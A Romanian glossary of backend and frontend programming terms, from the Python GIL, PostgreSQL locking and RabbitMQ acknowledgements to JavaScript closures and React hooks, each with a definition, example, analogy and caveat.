<!-- Glosar propus de Perplexity (15 oct 2026). „Forme” = formele în care termenul apare în text, ca să devină apăsabil. -->
### GIL
Forme: GIL, GIL-ul, GIL-ului

Definiție: Lock global din CPython care permite unui singur thread să execute bytecode Python la un moment dat.
Scop: Simplifică gestionarea internă a obiectelor Python, dar limitează paralelismul codului CPU-bound scris în Python pur.
Exemplu: Patru threaduri care calculează în Python pur se alternează; nu folosesc patru core-uri simultan.
Analogie: O singură tastatură pentru patru oameni: pot lucra pe rând, nu simultan.
Limită: GIL-ul se poate elibera în timpul I/O și în unele extensii native; nu face codul tău thread-safe.
Vezi și: thread, race condition, event loop

### bytecode
Forme: bytecode, bytecode-ul, bytecode-ului

Definiție: Reprezentare intermediară a codului Python, executată de mașina virtuală CPython.
Scop: Permite reutilizarea rezultatului compilării prin fișiere `.pyc` și execuția codului de către interpretor.
Exemplu: `python app.py` compilează sursa în bytecode, apoi CPython îl execută.
Analogie: Nu traduci direct romanul în limba vorbită; întâi faci o transcriere standardizată, apoi o citești.
Limită: Bytecode-ul nu este cod mașină nativ și nu verifică tipurile înainte de rulare.
Vezi și: CPython, `.pyc`, type hints

### thread
Forme: thread, threadul, threadului, threaduri, threadurile, threadurilor, thread-ul, thread-uri, thread-urile, threads

Definiție: Unitate de execuție în interiorul unui proces; threadurile aceluiași proces partajează memoria.
Scop: Permite concurență pentru operații I/O-bound, cum sunt apelurile HTTP sau citirile din DB.
Exemplu: `ThreadPoolExecutor` cu 10 workeri poate face 10 descărcări HTTP simultan.
Analogie: Mai mulți angajați în același birou, cu acces la aceleași dosare.
Limită: Memoria partajată cere sincronizare; GIL-ul limitează paralelismul bytecode-ului Python.
Vezi și: proces, GIL, race condition

### proces
Forme: proces, procesul, procesului, procese, procesele, proceselor

Definiție: Program în execuție, cu memorie și resurse proprii, gestionat de sistemul de operare.
Scop: Oferă izolare și permite paralelism real pe mai multe core-uri.
Exemplu: `ProcessPoolExecutor` rulează funcții în procese separate; datele trec prin pickle și IPC.
Analogie: Birouri separate: fiecare are dosarele lui; comunică prin curier.
Limită: Pornirea și comunicarea între procese costă mai mult; task-urile foarte mici nu merită.
Vezi și: thread, pickle, IPC

### corutină
Forme: corutină, corutina, corutine, corutinele, corutinei, corutinelor

Definiție: Funcție `async def` care poate fi pusă pe pauză la `await` și reluată ulterior.
Scop: Permite concurență eficientă pentru multe operații I/O, fără un thread per sarcină.
Exemplu: `await asyncio.sleep(1)` cedează controlul event loop-ului, fără să blocheze threadul.
Analogie: Un chelner care ia comanda, o trimite în bucătărie și servește alte mese până vine mâncarea.
Limită: O corutină nu rulează singură; trebuie programată de event loop sau executată prin `await`.
Vezi și: event loop, async/await, asyncio

### event loop
Forme: event loop, event loop-ul, event loop-ului, loop-ul, loop-ului

Definiție: Bucla care, pe un singur thread, ia la rând următoarea bucată de lucru gata să continue: corutinele în asyncio, callback-urile și promisiunile în JavaScript.
Scop: Coordonează sarcinile care așteaptă I/O, astfel încât una care așteaptă să nu blocheze celelalte.
Exemplu: La `await asyncio.sleep(1)`, loop-ul rulează alte task-uri și reia corutina după expirare. În browser, după un `fetch`, loop-ul randează pagina și tratează click-uri până vine răspunsul.
Analogie: Un dispatcher care urmărește ce sarcini pot continua și le redistribuie.
Limită: Un calcul lung blochează tot loop-ul: în asyncio nu mai rulează alte task-uri, în browser pagina nu mai răspunde.
Vezi și: corutină, microtask, promisiune
### I/O-bound vs CPU-bound
Forme: I/O-bound, CPU-bound

Definiție: I/O-bound înseamnă că sarcina așteaptă rețea, disc sau DB; CPU-bound înseamnă că procesorul lucrează continuu.
Scop: Determină alegerea între threads/asyncio și procese.
Exemplu: Descărcarea a 500 de fișiere este I/O-bound; parsarea a milioane de linii în Python pur este CPU-bound.
Analogie: Așteptarea coletului versus rezolvarea unei probleme de matematică.
Limită: Aceeași aplicație poate avea ambele tipuri de sarcini; le separi în componente diferite.
Vezi și: GIL, ProcessPoolExecutor, asyncio

### race condition
Forme: race condition, race condition-ul, race condition-uri, race-ul

Definiție: Situație în care rezultatul depinde de ordinea în care se intercalează accesurile concurente la o resursă partajată.
Scop: Explică de ce codul poate părea corect în teste, dar eșuează rar și imprevizibil în producție.
Exemplu: Două threaduri citesc `counter = 10`, fiecare scrie `11`, iar un increment se pierde.
Analogie: Doi oameni verifică aceeași cutie goală, apoi fiecare pune câte un bilet; unul se pierde.
Limită: GIL-ul nu elimină race conditions; folosești `Lock`, operații atomice sau eviți starea partajată.
Vezi și: GIL, thread, lock

### pickle
Forme: pickle, pickling, pickle-ul

Definiție: Formatul standard Python pentru serializarea obiectelor în bytes.
Scop: Permite trimiterea argumentelor și rezultatelor între procese prin IPC.
Exemplu: `ProcessPoolExecutor` serializează argumentele funcției pentru procesul worker.
Analogie: Împachetezi un obiect într-o cutie, îl trimiți și destinatarul îl reconstruiește.
Limită: Nu toate obiectele pot fi serializate; conexiuni DB, socket-uri și lambdas sunt exemple problematice.
Vezi și: IPC, proces, ProcessPoolExecutor

### IPC
Forme: IPC

Definiție: Inter-Process Communication: mecanisme prin care procese separate schimbă date.
Scop: Permite colaborarea proceselor care nu partajează memoria.
Exemplu: Rezultatul unui task din `ProcessPoolExecutor` revine în procesul părinte prin IPC.
Analogie: Curierul dintre două birouri separate.
Limită: IPC are cost; pentru task-uri foarte mici, overhead-ul poate depăși câștigul paralelismului.
Vezi și: proces, pickle, multiprocessing

### WSGI
Forme: WSGI

Definiție: Specificație sincronă pentru interfața dintre un server web și o aplicație Python.
Scop: Standardizează modul în care Gunicorn, Django sau Flask comunică.
Exemplu: `gunicorn myapp.wsgi` pornește o aplicație WSGI.
Analogie: Un contract fix între recepție și biroul care rezolvă cererea.
Limită: Nu este un server și nu este conceput pentru WebSockets sau streaming async.
Vezi și: ASGI, Gunicorn, worker

### ASGI
Forme: ASGI

Definiție: Specificație asincronă pentru interfața dintre server și aplicație, cu suport pentru WebSockets și streaming.
Scop: Permite serverelor precum Uvicorn să servească aplicații async precum FastAPI.
Exemplu: `uvicorn app:app` rulează o aplicație ASGI.
Analogie: Un contract care permite și conexiuni lungi, nu doar request-răspuns sincron.
Limită: ASGI nu face automat codul mai rapid; ajută când ai mult I/O concurent.
Vezi și: WSGI, Uvicorn, FastAPI

### worker (Gunicorn)
Forme: worker Gunicorn, workerul Gunicorn, workeri Gunicorn, workerii Gunicorn, worker sync, workerul sync, workeri sync

Definiție: Proces pornit de Gunicorn care execută aplicația și procesează request-uri.
Scop: Permite unui master să gestioneze mai multe procese, să le repornească și să distribuie încărcarea.
Exemplu: `gunicorn -w 4 app:app` pornește patru workeri.
Analogie: Un șef care supraveghează patru angajați care primesc clienți.
Limită: Un worker sync procesează de regulă un request odată; numărul de workeri trebuie dimensionat după sarcină.
Vezi și: Gunicorn, WSGI, reverse proxy

### threadpool
Forme: threadpool, threadpool-ul, threadpool-ului, thread pool, pool de threaduri

Definiție: Set de threaduri reutilizabile care execută sarcini trimise de aplicație.
Scop: Permite rularea codului blocant fără a bloca event loop-ul.
Exemplu: Starlette rulează endpointurile FastAPI `def` în threadpool.
Analogie: O echipă de curieri: cererile sosesc la dispatcher, iar curierii le execută.
Limită: Are capacitate limitată; dacă toate threadurile sunt ocupate, sarcinile așteaptă.
Vezi și: event loop, asyncio, FastAPI

### reverse proxy
Forme: reverse proxy, reverse proxy-ul, proxy-ul

Definiție: Server aflat în fața aplicației, care primește traficul clienților și îl trimite către backend.
Scop: Oferă TLS, buffering, distribuție de trafic și protecție față de clienți lenți.
Exemplu: Nginx în fața Gunicorn sau Uvicorn.
Analogie: Recepția care preia apelurile și le distribuie angajaților potriviți.
Limită: Nu execută aplicația Python; doar mediază traficul către serverul aplicației.
Vezi și: Nginx, Gunicorn, load balancer

### index B-tree
Forme: index B-tree, indexul B-tree, B-tree, B-tree-ul, B-tree-ului

Definiție: Structură de index ordonată, implicită în PostgreSQL, optimizată pentru egalitate, intervale și sortare.
Scop: Transformă un full scan într-un lookup mult mai rapid.
Exemplu: Indexul `(tenant_id, created_at)` accelerează filtrarea pe tenant și interval de timp.
Analogie: Cuprinsul unei cărți: găsești capitolul fără să citești fiecare pagină.
Limită: Fiecare scriere trebuie să actualizeze indexul; un index nu ajută orice query.
Vezi și: selectivitate, `EXPLAIN ANALYZE`, index compus

### selectivitate
Forme: selectivitate, selectivitatea, selectivității

Definiție: Cât de bine distinge o coloană valorile: mai multe valori distincte înseamnă de regulă selectivitate mai bună.
Scop: Ajută plannerul să decidă dacă merită să folosească un index.
Exemplu: `email` este de regulă foarte selectiv; `is_active` cu două valori este puțin selectiv.
Analogie: Căutarea după nume complet versus căutarea după „toți oamenii care respiră”.
Limită: O coloană puțin selectivă poate totuși beneficia de un index parțial sau compus.
Vezi și: index B-tree, `EXPLAIN ANALYZE`, index parțial

### `EXPLAIN ANALYZE`
Forme: EXPLAIN ANALYZE, EXPLAIN

Definiție: Comandă PostgreSQL care arată planul de execuție și, cu `ANALYZE`, îl execută pentru a măsura timpul real.
Scop: Verifici dacă un query folosește indexul, dacă estimările plannerului sunt corecte și unde se pierde timpul.
Exemplu: `EXPLAIN (ANALYZE, BUFFERS) SELECT ...` arată Seq Scan versus Index Scan.
Analogie: Nu ghicești ruta; urmărești GPS-ul în timp ce mergi.
Limită: Pe producție, folosește-l cu grijă: `ANALYZE` execută efectiv query-ul.
Vezi și: index B-tree, query plan, pg_stat_statements

### tranzacție
Forme: tranzacție, tranzacția, tranzacții, tranzacțiile, tranzacției, tranzacțiilor

Definiție: Grup de operații DB tratate ca o unitate: fie toate se confirmă, fie toate se anulează.
Scop: Păstrează consistența atunci când mai multe modificări trebuie să reușească împreună.
Exemplu: `BEGIN; UPDATE ...; INSERT ...; COMMIT;`.
Analogie: Transfer bancar: retragerea și depunerea trebuie să se întâmple împreună.
Limită: O tranzacție nu îngheață automat datele citite; vizibilitatea depinde de nivelul de izolare.
Vezi și: nivel de izolare, MVCC, lock

### nivel de izolare
Forme: nivel de izolare, nivelul de izolare, niveluri de izolare, nivelurile de izolare

Definiție: Regula prin care o tranzacție vede modificările altor tranzacții concurente.
Scop: Alegi compromisul între consistență percepută și concurență.
Exemplu: PostgreSQL folosește implicit `READ COMMITTED`.
Analogie: Când primești o copie a raportului: la fiecare întrebare sau o dată pentru toată ședința.
Limită: Nivelul implicit nu previne toate anomaliile; pentru operații critice, folosești lock-uri, `UPDATE` condiționat sau izolare mai strictă.
Vezi și: tranzacție, MVCC, READ COMMITTED

### MVCC
Forme: MVCC

Definiție: Multi-Version Concurrency Control: PostgreSQL păstrează versiuni de rânduri, astfel încât cititorii și scriitorii să nu se blocheze reciproc în mod normal.
Scop: Permite concurență ridicată fără lock-uri exclusive pentru fiecare citire.
Exemplu: Un `UPDATE` creează o nouă versiune a rândului; cititorii vechi văd versiunea anterioară.
Analogie: Documentul are mai multe versiuni; fiecare cititor vede versiunea relevantă pentru el.
Limită: Versiunile moarte trebuie curățate de VACUUM/autovacuum.
Vezi și: VACUUM, tranzacție, nivel de izolare

### lock
Forme: lock, lock-ul, lock-uri, lock-urile, lock-ului, lock-urilor

Definiție: Mecanism prin care o tranzacție sau un thread rezervă temporar o resursă pentru a preveni conflicte.
Scop: Protejează operațiile care citesc și modifică aceeași stare.
Exemplu: `SELECT ... FOR UPDATE` blochează rândurile selectate până la commit/rollback.
Analogie: Îți pui un semn pe documentul pe care îl editezi.
Limită: Lock-urile pot duce la așteptare sau deadlock; păstrează tranzacțiile scurte și folosește aceeași ordine de acces.
Vezi și: deadlock, `FOR UPDATE`, tranzacție

### deadlock
Forme: deadlock, deadlock-ul, deadlock-uri, deadlock-ului

Definiție: Situație în care două sau mai multe tranzacții se așteaptă reciproc pe lock-uri și niciuna nu poate avansa.
Scop: Explică de ce unele tranzacții sunt anulate de PostgreSQL.
Exemplu: A blochează rândul 1 și vrea rândul 2; B blochează rândul 2 și vrea rândul 1.
Analogie: Doi oameni se opresc în ușă, fiecare așteptând ca celălalt să treacă primul.
Limită: PostgreSQL anulează una dintre tranzacții; aplicația trebuie să facă retry și să folosească o ordine constantă a lock-urilor.
Vezi și: lock, tranzacție, retry

### ORM
Forme: ORM, ORM-ul, ORM-ului

Definiție: Object-Relational Mapper: bibliotecă care mapează rândurile din DB pe obiecte Python și invers.
Scop: Reduce SQL-ul repetitiv și oferă un model orientat pe obiecte.
Exemplu: SQLAlchemy și Django ORM construiesc query-uri din modele și expresii Python.
Analogie: Un traducător între obiectele din cod și tabelele din DB.
Limită: ORM-ul nu elimină SQL-ul; pentru performanță, trebuie să înțelegi ce query generează.
Vezi și: SQLAlchemy, Session, lazy loading

### Session (SQLAlchemy)
Forme: Session, Session-ul, sesiunea SQLAlchemy, sesiune SQLAlchemy

Definiție: Obiectul care gestionează unitatea de lucru: obiectele urmărite, flush-ul, commit-ul și identity map-ul.
Scop: Colectează modificările și le trimite în DB într-o manieră controlată.
Exemplu: Creezi un obiect, îl adaugi în sesiune, apoi `commit()` trimite `INSERT`.
Analogie: Un coș de cumpărături: adaugi articole, apoi plătești o dată.
Limită: Nu este thread-safe; folosește o sesiune per request sau per task, nu una globală.
Vezi și: identity map, flush, lazy loading

### identity map
Forme: identity map, identity map-ul, identity map-ului

Definiție: Harta dintr-o sesiune SQLAlchemy care asociază un rând identificat prin PK cu un singur obiect Python.
Scop: Evită două obiecte diferite pentru același rând în aceeași sesiune.
Exemplu: Două query-uri pentru userul cu `id=7` în aceeași sesiune întorc același obiect.
Analogie: Un singur dosar pentru același client, nu copii diferite în fiecare sertar.
Limită: Funcționează în limitele unei sesiuni; după închiderea ei, obiectele pot deveni detached.
Vezi și: Session, DetachedInstanceError, ORM

### lazy loading
Forme: lazy loading, lazy load, lazy load-ul, lazy loading-ul

Definiție: Încărcarea unei relații abia la primul acces al atributului, nu odată cu obiectul părinte.
Scop: Evită încărcarea inutilă a datelor, dar poate genera multe query-uri.
Exemplu: `u.orders` declanșează un SELECT separat la primul acces.
Analogie: Nu aduci toate dosarele; le ceri abia când ai nevoie de ele.
Limită: Într-o buclă poate produce N+1; folosești `selectinload` sau `joinedload`.
Vezi și: N+1, eager loading, Session

### N+1
Forme: N+1

Definiție: Pattern în care un query pentru o listă este urmat de câte un query pentru fiecare element al listei.
Scop: Identifici o cauză frecventă de latență și încărcare a DB-ului.
Exemplu: 100 de useri cu relație lazy pentru comenzi produc 101 query-uri.
Analogie: Ceri lista angajaților, apoi telefonezi separat pentru fiecare ca să afli departamentul.
Limită: Nu orice număr mare de query-uri este N+1; problema este relația 1 + N cauzată de accesul per element.
Vezi și: lazy loading, selectinload, joinedload

### eager loading
Forme: eager loading, eager loading-ul

Definiție: Încărcarea explicită a relațiilor împreună cu obiectul părinte, printr-un JOIN sau un query separat.
Scop: Evită N+1 atunci când știi că vei folosi relația.
Exemplu: `.options(selectinload(User.orders))` încarcă comenzile userilor.
Analogie: Ceri lista angajaților și departamentele lor într-o singură cerere.
Limită: Poate aduce date în plus dacă relația nu este folosită; alege varianta potrivită relației.
Vezi și: lazy loading, selectinload, joinedload

### migrație (Alembic)
Forme: migrație, migrația, migrații, migrațiile, migrației, migrațiilor

Definiție: Script versionat care modifică schema bazei de date, generat și aplicat cu Alembic.
Scop: Face schimbările de schemă reproductibile între medii.
Exemplu: `alembic revision --autogenerate`, verifici draft-ul, apoi `alembic upgrade head`.
Analogie: Un changelog executabil pentru structura DB-ului.
Limită: Autogenerate produce un draft; redenumirile pot apărea ca drop plus add și trebuie corectate manual.
Vezi și: Alembic, expand/contract, SQLAlchemy

### broker
Forme: broker, brokerul, brokerului, brokeri, brokerii

Definiție: Componentă care primește mesaje de la producători și le livrează consumatorilor.
Scop: Decuplează serviciile și permite retry, scalare și procesare asincronă.
Exemplu: RabbitMQ primește task-uri Celery și le livrează workerilor.
Analogie: O centrală care primește pachete și le distribuie curierilor.
Limită: Brokerul nu garantează automat exactly-once; modelele de ack și retry determină garanțiile.
Vezi și: coadă, ack, Celery

### coadă
Forme: coadă, coada, cozi, cozile, cozii, cozilor

Definiție: Structură în care mesajele așteaptă să fie preluate de consumatori.
Scop: Tampon între producători și consumatori, cu posibilitatea de a distribui munca.
Exemplu: O coadă RabbitMQ pentru task-uri de procesare a alertelor.
Analogie: Rând la ghișeu: fiecare persoană este preluată de un angajat disponibil.
Limită: Cu mai mulți consumatori, ordinea globală de procesare nu este garantată.
Vezi și: broker, consumer, prefetch

### exchange
Forme: exchange, exchange-ul, exchange-ului, exchange-uri, exchange-urile

Definiție: Componenta RabbitMQ care primește mesajul de la producător și decide în ce cozi ajunge, pe baza binding-urilor.
Scop: Separă publicarea mesajului de logica de livrare către cozi.
Exemplu: Un `topic exchange` trimite un mesaj către cozi pe baza unui pattern de routing key.
Analogie: Un sortator poștal care citește adresa și decide cutiile poștale.
Limită: Mesajul nu stă în exchange; ajunge în cozi sau este pierdut dacă nu există binding potrivit.
Vezi și: routing key, binding, RabbitMQ

### routing key
Forme: routing key, routing key-ul, routing key-ului

Definiție: Eticheta folosită de producător și de binding-uri pentru a dirija un mesaj către cozi.
Scop: Permite routing flexibil fără ca producătorul să cunoască direct cozile.
Exemplu: `alert.sap.login_failed` poate ajunge într-o coadă pentru alerte SAP.
Analogie: Codul poștal scris pe plic.
Limită: Semnificația exactă depinde de tipul de exchange: direct, topic, fanout sau headers.
Vezi și: exchange, binding, RabbitMQ

### ack
Forme: ack, ack-ul, ack-uri, ack-urile, ack-ului

Definiție: Confirmarea prin care consumatorul îi spune brokerului că mesajul a fost procesat.
Scop: Determină momentul în care brokerul poate considera mesajul livrat.
Exemplu: Celery confirmă implicit la primire; cu `acks_late=True`, confirmă după execuție.
Analogie: Semnezi dovada de primire după ce ai deschis pachetul.
Limită: Ack-ul nu garantează exact o execuție; poate duce la pierdere sau la re-livrare, în funcție de moment.
Vezi și: at-least-once, idempotență, prefetch

### prefetch
Forme: prefetch, prefetch-ul, prefetch count

Definiție: Numărul de mesaje neconfirmate pe care un consumator le poate avea rezervate.
Scop: Controlează distribuția muncii și backpressure-ul.
Exemplu: `worker_prefetch_multiplier=1` în Celery pentru task-uri lungi.
Analogie: Un curier ia un pachet, nu zece, dacă livrarea fiecăruia durează mult.
Limită: Prefetch mare poate lăsa mesaje blocate la un worker lent.
Vezi și: ack, backpressure, RabbitMQ

### idempotență
Forme: idempotență, idempotența, idempotent, idempotentă, idempotente, idempotenți

Definiție: Proprietatea unei operații care poate fi executată de mai multe ori fără a produce efecte suplimentare după prima aplicare reușită.
Scop: Face re-livrările și retry-urile sigure.
Exemplu: `UPDATE ... SET status='paid' WHERE id=7 AND status!='paid'` este mai sigur decât incrementarea oarbă.
Analogie: Apăsarea butonului de lift: apăsările repetate nu cer un lift nou.
Limită: Idempotența se proiectează explicit; nu apare automat pentru orice task sau endpoint.
Vezi și: at-least-once, ack, retry

### at-least-once
Forme: at-least-once

Definiție: Garanția că un mesaj poate fi livrat de mai multe ori, dar nu va fi pierdut în mod normal.
Scop: Pune pe primul loc evitarea pierderii de date, cu prețul unor posibile duplicate.
Exemplu: `acks_late=True` în Celery poate duce la re-livrare după un crash.
Analogie: Îți retrimite pachetul dacă nu confirmi primirea; poți primi două exemplare.
Limită: Necesită idempotență sau deduplicare în consumer.
Vezi și: idempotență, ack, at-most-once

### TTL
Forme: TTL, TTL-ul, TTL-uri, TTL-ului

Definiție: Time To Live: durata după care o cheie Redis expiră automat.
Scop: Limitează prospețimea datelor din cache și previne acumularea nelimitată.
Exemplu: `SET user:7 '{...}' EX 300` păstrează cheia 300 de secunde.
Analogie: Un bilet cu valabilitate de cinci minute.
Limită: TTL nu garantează consistență imediată cu DB-ul; completează-l cu invalidare la scriere.
Vezi și: cache-aside, Redis, invalidare

### cache-aside
Forme: cache-aside

Definiție: Pattern în care aplicația citește din cache, iar la miss citește din DB și populează cache-ul.
Scop: Reduce citirile repetate din DB fără ca Redis să devină sursa de adevăr.
Exemplu: Redis miss → Postgres → `SET` în Redis cu TTL.
Analogie: Verifici notițele; dacă nu ai nota, întrebi sursa și notezi răspunsul.
Limită: Poate avea date vechi între scriere și invalidare; poate suferi cache stampede.
Vezi și: TTL, Redis, write-behind

### fixture
Forme: fixture, fixture-ul, fixture-uri, fixture-urile, fixture-ului, fixture-urilor

Definiție: Funcție pytest care pregătește date sau resurse pentru teste și poate face cleanup după.
Scop: Elimină duplicarea setup-ului și izolează testele.
Exemplu: O fixture care creează o sesiune DB, rulează testul și face rollback.
Analogie: Pregătești masa înainte de test și o strângi după.
Limită: Scope-ul contează: `function`, `module` sau `session` schimbă cât de des se recrează resursa.
Vezi și: pytest, mock, teardown

### mock
Forme: mock, mock-ul, mock-uri, mock-urile, mock-ului

Definiție: Obiect care înlocuiește o dependență reală în teste și îți permite să verifici interacțiunile.
Scop: Testezi o unitate fără să apelezi servicii externe reale.
Exemplu: `patch("app.services.send_email")` înlocuiește trimiterea reală de email.
Analogie: Un actor care joacă rolul unui coleg într-o repetiție.
Limită: Mock-ul nu validează automat contractul real; folosește `autospec=True` și testează și integrarea unde contează.
Vezi și: fixture, pytest, side_effect

### JWT
Forme: JWT, JWT-ul, JWT-ului, JWT-uri

Definiție: JSON Web Token: token semnat, de regulă în trei părți, folosit pentru a transmite claims verificabile.
Scop: Permite unui serviciu să verifice identitatea sau autorizațiile fără să interogheze de fiecare dată emitentul.
Exemplu: Verifici semnătura, `exp`, `iss` și `aud` înainte de a avea încredere în token.
Analogie: O legitimație semnată: o poți citi, dar trebuie să verifici semnătura și valabilitatea.
Limită: JWT este semnat, nu criptat; conținutul payload-ului poate fi citit de oricine îl vede.
Vezi și: OAuth2, OIDC, JWKS

### SSRF
Forme: SSRF

Definiție: Server-Side Request Forgery: atac în care un atacator determină serverul să facă request-uri către resurse interne.
Scop: Previne accesul neautorizat la servicii interne, metadata cloud sau rețeaua privată.
Exemplu: Un endpoint care preia un URL de la user și îl apelează direct de pe server.
Analogie: Cineva îți dă o adresă din interiorul firmei și te convinge să duci tu acolo un pachet.
Limită: Validarea simplă a schemei nu este suficientă; folosești allowlist și blochezi IP-uri private/metadata.
Vezi și: allowlist, IMDSv2, securitate backend

### imagine vs container
Forme: imagine Docker, imaginea Docker, imagini Docker, container, containerul, containere, containerele, containerului, containerelor

Definiție: Imaginea este șablonul imutabil cu layere; containerul este instanța care rulează din acea imagine.
Scop: Distingi între artefactul construit și procesul în execuție.
Exemplu: Din aceeași imagine `app:1.2.0` poți porni mai multe containere.
Analogie: Rețeta versus felul de mâncare gătit și servit.
Limită: Containerul adaugă un layer de scriere și procesul rulează izolat prin namespaces și cgroups.
Vezi și: Docker, layer, orchestrare

### SIGTERM vs SIGKILL
Forme: SIGTERM, SIGKILL

Definiție: `SIGTERM` este semnalul 15, care poate fi tratat de proces; `SIGKILL` este semnalul 9, aplicat de kernel și neinterceptabil.
Scop: Controlează diferența dintre oprirea grațioasă și oprirea forțată.
Exemplu: Kubernetes trimite întâi `SIGTERM`, apoi `SIGKILL` după grace period.
Analogie: Îți cer politicos să pleci versus îți închid ușa.
Limită: `SIGKILL` nu oferă cleanup; poate lăsa conexiuni sau mesaje nereconfirmate.
Vezi și: kill, grace period, container

<!-- Termeni de frontend (5 nov. 2026, tichetul 01 din .scratch/frontend-extins). Formele evită ciocnirile: „DOM” singur ar lega ID-urile DOM-xx, „reconciliere” și „promisiune” singure au sens obișnuit în alte module. -->

### closure
Forme: closure, closure-ul, closure-ului, closures, closure-uri, closure-urile

Definiție: O funcție împreună cu variabilele din locul unde a fost creată, pe care le poate citi și după ce acel loc s-a terminat.
Scop: Permite unei funcții să „țină minte” date fără variabile globale: contoare, callback-uri, handlere.
Exemplu: `makeCounter()` întoarce o funcție care crește un `n` local; fiecare contor are `n`-ul lui.
Analogie: Un rucsac pe care funcția îl ia cu ea, cu variabilele din camera în care s-a născut.
Limită: Closure-ul ține variabila, nu o copie a valorii; în Python și JavaScript vezi valoarea de la momentul apelului.
Vezi și: stale closure, scope de bloc

### stale closure
Forme: stale closure, stale closure-ul, stale closures, closure vechi, closure-ul vechi

Definiție: Un closure care citește valori dintr-un render mai vechi, pentru că a fost creat atunci și nu a mai fost recreat.
Scop: Explică bug-ul clasic din React în care un `setInterval` sau un handler vede mereu state-ul inițial.
Exemplu: `setInterval(() => setN(n + 1), 1000)` într-un effect cu `[]` vede mereu `n = 0`, deci contorul rămâne la 1.
Analogie: O fotografie veche pe care o tot consulți ca să afli ce oră e.
Limită: Repari cu forma funcțională (`setN(x => x + 1)`), cu dependențele corecte în effect sau cu un `useRef`.
Vezi și: closure, render, effect

### scope de bloc
Forme: scope de bloc, scope-ul de bloc, block scope

Definiție: Zona dintre `{` și `}` în care trăiește o variabilă declarată cu `let` sau `const`; `var` ignoră blocul și trăiește în toată funcția.
Scop: Explică de ce `let` dintr-un `for` dă o variabilă nouă la fiecare iterație, iar `var` una singură.
Exemplu: Cu `for (var i…)` și `setTimeout`, toate callback-urile afișează aceeași valoare finală; cu `let` afișează 0, 1, 2.
Limită: Python nu are scope de bloc: o variabilă din `if` sau `for` rămâne vizibilă în toată funcția.
Vezi și: hoisting, TDZ, closure

### hoisting
Forme: hoisting, hoisting-ul, hoisting-ului

Definiție: Comportamentul prin care JavaScript înregistrează declarațiile la începutul scope-ului, înainte să ruleze codul.
Scop: Explică de ce poți apela o funcție declarată mai jos și de ce un `var` citit înainte de declarație dă `undefined`, nu eroare.
Exemplu: `console.log(x); var x = 1;` afișează `undefined`; cu `let x` aruncă `ReferenceError`.
Limită: Se înregistrează doar declarația, nu valoarea. `let`, `const` și `class` sunt și ele înregistrate, dar stau în TDZ până la linia lor.
Vezi și: TDZ, scope de bloc

### TDZ
Forme: TDZ, temporal dead zone, TDZ-ul

Definiție: Porțiunea dintre începutul blocului și linia unde e declarat un `let` sau `const`, în care variabila există, dar nu poate fi citită.
Scop: Transformă folosirea unei variabile înainte de declarație într-o eroare clară (`ReferenceError`), în loc de un `undefined` tăcut.
Exemplu: `{ f(); let x = 1; function f() { return x; } }` aruncă `ReferenceError`, fiindcă `f` citește `x` din TDZ.
Vezi și: hoisting, scope de bloc

### prototip
Forme: prototip, prototipul, prototipului, prototipuri, prototipurile, lanțul de prototipuri, prototype chain

Definiție: Obiectul la care JavaScript caută o proprietate când ea lipsește din obiectul tău; prototipurile se leagă într-un lanț până la `Object.prototype`.
Scop: E mecanismul de moștenire din JavaScript; `class` e doar o sintaxă mai comodă peste el.
Exemplu: `[1, 2].map` nu stă în array, ci în `Array.prototype`, găsit pe lanț.
Limită: Nu e o copie: dacă schimbi metoda din prototip, toate obiectele o văd imediat.
Vezi și: closure

### promisiune
Forme: promisiunea, promisiunii, promisiuni, promisiunile, promisiunilor, Promise, promise-ul, promise-uri

Definiție: Un obiect care reprezintă un rezultat care va veni mai târziu; e pending, apoi fulfilled (cu o valoare) sau rejected (cu o eroare).
Scop: Permite cod asincron fără callback-uri imbricate; `async` / `await` e sintaxă peste promisiuni.
Exemplu: `fetch(url)` întoarce imediat o promisiune; `await fetch(url)` așteaptă răspunsul.
Limită: O promisiune e mereu truthy: `if (fetchUser())` fără `await` intră mereu pe ramură. O promisiune respinsă fără handler dă unhandled rejection.
Vezi și: microtask, event loop

### microtask
Forme: microtask, microtask-ul, microtask-uri, microtask-urile, microtask-urilor

Definiție: O sarcină scurtă, din coada de microtask-uri (de exemplu continuarea unei promisiuni), care rulează imediat după codul curent, înaintea oricărui timer.
Scop: Explică ordinea: cod sincron → toate microtask-urile → următorul task (`setTimeout`, un click).
Exemplu: `setTimeout(a, 0); Promise.resolve().then(b);` rulează `b` înaintea lui `a`.
Limită: Coada se golește complet; un microtask care adaugă mereu altul blochează timerele și randarea.
Vezi și: event loop, promisiune

### JSX
Forme: JSX, JSX-ul, JSX-ului, TSX

Definiție: Sintaxa care arată ca HTML în cod JavaScript; compilatorul o transformă în apeluri care descriu elementele React.
Scop: Descrii interfața ca structură, nu ca pași de modificare a paginii.
Exemplu: `<Badge n={3} />` devine un obiect care spune „componenta `Badge` cu props `{ n: 3 }`”.
Limită: JSX escapează textul automat; excepția e `dangerouslySetInnerHTML`.
Vezi și: props, render

### props
Forme: props, props-urile, props-urilor

Definiție: Datele pe care o componentă le primește de la părinte, ca argumente; componenta nu le modifică.
Scop: Fac componentele reutilizabile: aceeași componentă, alte date.
Exemplu: `<UserCard name="Ana" />` primește `props.name === "Ana"`.
Limită: Copilul nu poate schimba props; ca să schimbe ceva în părinte, primește un callback prin props (`onChange`).
Vezi și: state, render

### state
Forme: state, state-ul, state-ului

Definiție: Datele pe care o componentă le ține de la un render la altul (`useState`); când le schimbi prin setter, React randează din nou componenta.
Scop: E memoria componentei: ce a tastat userul, ce tab e deschis, ce a venit de la server.
Exemplu: `const [n, setN] = useState(0);` iar `setN(1)` programează un render nou, cu `n = 1`.
Limită: În același render, `n` nu se schimbă după `setN`: fiecare render are propria valoare, ca un snapshot.
Vezi și: props, re-render, batching

### hook
Forme: hook, hook-ul, hook-ului, hook-uri, hook-urile, hook-urilor, hooks

Definiție: O funcție React care începe cu `use` (`useState`, `useEffect`, `useRef`) și leagă componenta de mecanismele React.
Scop: Dă unei componente funcție state, efecte și acces la context.
Exemplu: `useFetch(url)` e un custom hook: o funcție a ta care apelează alte hook-uri.
Limită: React recunoaște hook-urile după ordinea apelurilor, deci le apelezi doar la nivelul de sus, nu în `if`, bucle sau după un `return`.
Vezi și: effect, state

### effect
Forme: effect, effect-ul, effect-ului, effect-uri, effect-urile, effect-urilor

Definiție: Cod pus în `useEffect`, care rulează după ce React a actualizat pagina, ca să sincronizeze componenta cu ceva din afara ei (rețea, timer, socket).
Scop: Separă descrierea interfeței (render) de lucrurile care au loc în exterior.
Exemplu: Un effect deschide un WebSocket când apare componenta, iar cleanup-ul lui îl închide.
